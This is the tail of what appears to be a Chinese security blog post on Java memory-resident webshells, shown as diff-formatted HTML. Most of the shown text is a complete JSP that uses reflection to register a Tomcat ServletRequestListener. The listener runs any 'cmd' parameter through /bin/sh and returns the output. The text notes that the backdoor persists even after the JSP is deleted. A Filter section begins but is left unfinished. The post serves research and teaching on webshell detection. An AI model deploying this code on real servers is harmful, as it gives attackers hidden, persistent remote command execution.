+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221719716.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221719716.png-water_print" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.util.*,javax.crypto.*,javax.crypto.spec.*&#34;</span><span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.jasper.tagplugins.jstl.core.Out&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;javax.servlet.annotation.WebServlet&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.InputStreamReader&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.BufferedReader&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span>
+     <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">();</span>
+     <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+     <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+     <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+     <span class="n">field</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+     <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+     <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
+     <span class="n">ListenH</span> <span class="n">listenH</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ListenH</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
+    <span class="n">standardContext</span><span class="o">.</span><span class="na">addApplicationEventListener</span><span class="o">(</span><span class="n">listenH</span><span class="o">);</span>
+    <span class="n">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">&#34;test&#34;</span><span class="o">);</span>
+<span class="o">%&gt;</span>
+<span class="o">&lt;%!</span>
+    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">ListenH</span> <span class="kd">implements</span> <span class="n">ServletRequestListener</span> <span class="o">{</span>
+        <span class="kd">public</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">;</span>
+        <span class="kd">public</span> <span class="n">ServletRequest</span> <span class="n">request</span><span class="o">;</span>
+
+        <span class="n">ListenH</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">request</span> <span class="o">=</span> <span class="n">request</span><span class="o">;</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">response</span> <span class="o">=</span> <span class="n">response</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestDestroyed</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">cmder</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
+            <span class="n">String</span><span class="o">[]</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmder</span><span class="o">};</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">Process</span> <span class="n">ps</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+                <span class="n">BufferedReader</span> <span class="n">br</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">ps</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
+                <span class="n">StringBuffer</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
+                <span class="n">String</span> <span class="n">line</span><span class="o">;</span>
+                <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="c1">//执行结果加上回车
+</span><span class="c1"></span>                    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;&lt;br&gt;&#34;</span><span class="o">);</span>
+                <span class="o">}</span>
+                <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;error &#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">%&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>通过 jsp 尝试动态添加 Listener，这里需要注意, 因为我们是直接通过 add 来添加, 所以每次访问该 jsp 页面的时候都会重复添加 Listener，导致恶意 payload 重复执行。添加成功后访问任意存在的页面 <code>?cmd=</code> 要执行的命令即可, 即使 jsp 文件被删除依然可以使用。</p>
+<h4 id="323-filter-内存马">3.2.3 Filter 内存马</h4>
+<p>Filter 被称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。</p>
+<p>未完待续。。</p>
+<h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/frszc9I61sTRddRKWRk_0Q" target="_blank" rel="noopener noreffer">web 攻防技术|内存马分析</a></li>
+<li><a href="https://mp.weixin.qq.com/s/IT8rftwtbNxJeVf04gr-pQ" target="_blank" rel="noopener noreffer">内存马到底是个什么东西</a></li>
+<li><a href="http://wjlshare.com/archives/1529" target="_blank" rel="noopener noreffer">Tomcat 内存马学习</a></li>
+<li><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener noreffer">一文看懂内存马</a></li>
+<li><a href="https://mp.weixin.qq.com/s/GRwEBS1UqsWA3MBvukypNg" target="_blank" rel="noopener noreffer">python flask 内存马</a></li>
+<li><a href="http://li9hu.top/tomcat%e5%86%85%e5%ad%98%e9%a9%ac%e4%b8%80-%e5%88%9d%e6%8e%a2/" target="_blank" rel="noopener noreffer">Tomcat 内存马初探</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-09-22</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" data-title="Webshell 内存马分析"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" data-title="Webshell 内存马分析"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" data-title="Webshell 内存马分析"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>,&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/" class="prev" rel="prev" title="Java反序列化漏洞系列-5"><i class="fas fa-angle-left fa-fw"></i>Java反序列化漏洞系列-5</a>
+            <a href="/2021/09/ntlm-relay/" class="next" rel="next" title="NTLM Relay">NTLM Relay<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
